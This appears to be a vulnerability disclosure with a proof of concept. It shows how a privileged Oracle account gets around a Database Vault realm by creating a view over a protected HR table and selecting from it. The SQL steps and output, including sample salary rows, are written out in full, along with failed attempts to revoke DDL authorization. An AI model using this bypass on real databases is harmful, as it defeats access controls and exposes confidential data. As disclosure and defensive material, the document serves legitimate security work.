
Overview:

Oracle Database Vault is a security feature that provides controls to prevent unauthorized privileged users from accessing sensitive data, prevent unauthorized database changes, and helps customers meet industry, regulatory, or corporate security standards.


*****************************************
Vulnerability Details:

data extraction/exfiltration of a sensitive table that is protected with a security realm was possible by privileged account. The DB vault is designed to protect against privileged accounts being able to access confidential data !!


*****************************************
Proof of Concept (PoC):

A sensitive table called “HR.sensitive_table” in PDB1 under HR schema will be protected with REALM through the following steps:

sqlplus c##dbv_owner_root_backup/dbv_2020@PDB1

SQL> begin
    DBMS_MACADM.CREATE_REALM (
realm_name=> 'HR Access Protection',
description=> 'HR schema in PDB1',
enabled=> DBMS_MACUTL.G_YES,
audit_options=> DBMS_MACUTL.G_REALM_AUDIT_FAIL,
realm_type=> 1);
end;
/

SQL> begin
    DBMS_MACADM.ADD_OBJECT_TO_REALM(
realm_name=> 'HR Access Protection',
object_owner=> 'HR',
object_name=> 'sensitive_table',
object_type=> 'TABLE');
end;
/

SQL>  begin
    DBMS_MACADM.ADD_AUTH_TO_REALM(
realm_name=> 'HR Access Protection',
grantee=> 'HR',
auth_options=> DBMS_MACUTL.G_REALM_AUTH_OWNER);
end;
/

Now as SYS user I shouldn’t be able to view the data of table HR.sensitive_table as expected…..However I was able to create a view under HR schema to “extract” the confidential data !


So, the exploit was basically executing the following two SQL statements (view creation of the protected realm table and then viewing the data from the view. The exploit required two system privileges: create any view, select any view)

SQL> create or replace view HR.DUMMY_V as select * from HR.sensitive_table;

SQL> select * from HR.DUMMY_V;

Per documentation to revoke DDL authorization, you can use DBMS_MACADM.UNAUTHORIZE_DDL procedure:

    https://docs.oracle.com/database/121/DVADM/release_changes.htm#DVADM70086

    based on that let us simulate:

    ORACLE19c > sqlplus c##dbv_owner_root_backup/XXXXXXX@PDB1


    SQL> select * from DBA_DV_DDL_AUTH;

GRANTEE
——————————————————————————–
SCHEMA
——————————————————————————–
%
%


SQL> exec DBMS_MACADM.UNAUTHORIZE_DDL(‘SYS’,’HR’);
BEGIN DBMS_MACADM.UNAUTHORIZE_DDL(‘SYS’,’HR’); END;

*
ERROR at line 1:
ORA-47974: Oracle DDL authorization for Oracle Database Vault to SYS on schema
HR is not found.
ORA-06512: at “DVSYS.DBMS_MACADM”, line 1435
ORA-06512: at “DVSYS.DBMS_MACADM”, line 1678
ORA-06512: at line 1


SQL> EXEC DBMS_MACADM.UNAUTHORIZE_DDL(‘SYS’, ‘%’);
BEGIN DBMS_MACADM.UNAUTHORIZE_DDL(‘SYS’, ‘%’); END;

*
ERROR at line 1:
ORA-47974: Oracle DDL authorization for Oracle Database Vault to SYS on schema
% is not found.
ORA-06512: at “DVSYS.DBMS_MACADM”, line 1435
ORA-06512: at “DVSYS.DBMS_MACADM”, line 1678
ORA-06512: at line 1

Then, i tried to execute the same procedure for SYSTEM account:

SQL> EXEC DBMS_MACADM.UNAUTHORIZE_DDL(‘SYSTEM’, ‘%’);
BEGIN DBMS_MACADM.UNAUTHORIZE_DDL(‘SYSTEM’, ‘%’); END;

*
ERROR at line 1:
ORA-47974: Oracle DDL authorization for Oracle Database Vault to SYSTEM on
schema % is not found.
ORA-06512: at “DVSYS.DBMS_MACADM”, line 1435
ORA-06512: at “DVSYS.DBMS_MACADM”, line 1678
ORA-06512: at line 1


SQL> EXEC DBMS_MACADM.UNAUTHORIZE_DDL(‘SYSTEM’, ‘HR’);
BEGIN DBMS_MACADM.UNAUTHORIZE_DDL(‘SYSTEM’, ‘HR’); END;

*
ERROR at line 1:
ORA-47974: Oracle DDL authorization for Oracle Database Vault to SYSTEM on
schema HR is not found.
ORA-06512: at “DVSYS.DBMS_MACADM”, line 1435
ORA-06512: at “DVSYS.DBMS_MACADM”, line 1678
ORA-06512: at line 1

For the sake of illustration, i granted SYSTEM account DDL authorization to see if the view is updated ( and view was updated successfully):

SQL> EXEC DBMS_MACADM.AUTHORIZE_DDL(‘SYSTEM’, ‘HR’);

PL/SQL procedure successfully completed.

SQL> select * from DBA_DV_DDL_AUTH;

GRANTEE
——————————————————————————–
SCHEMA
——————————————————————————–
%
%

SYSTEM
HR

After that i have removed the DDL authorization as shown below:

SQL> EXEC DBMS_MACADM.UNAUTHORIZE_DDL(‘SYSTEM’, ‘HR’);

PL/SQL procedure successfully completed.

SQL> select * from DBA_DV_DDL_AUTH;

GRANTEE                                                                                                                          SCHEMA
——————————————————————————————————————————– ——————————————————————————————————————————–
%   %

This doesn’t make any difference as SYSTEM account as shown below will still be able to create the view even though  DBMS_MACADM.UNAUTHORIZE_DDL was executed successfully:

ORACLE19c > sqlplus system/XXXXX@PDB1


SQL> select * from HR.sensitive_table;
select * from HR.sensitive_table
    *
ERROR at line 1:
ORA-01031: insufficient privileges


SQL> create or replace view HR.sensitive_table3c as select * from HR.sensitive_table;

View created.

SQL> select * from HR.sensitive_table3c ;

FNAME      LNAME      EXECUTIVE_COMPENSATION
———- ———- ——————————
MRIO       BASIL      1200000
Thomas     Raynold    1100000
Jessica    Rodrigo    3200000



*****************************************
- Defensive Techniques:

configure security auditing.
ensure database accounts have strong passwords, and rotate passwords regularly if possible.
pro-actively patch your systems and database systems.
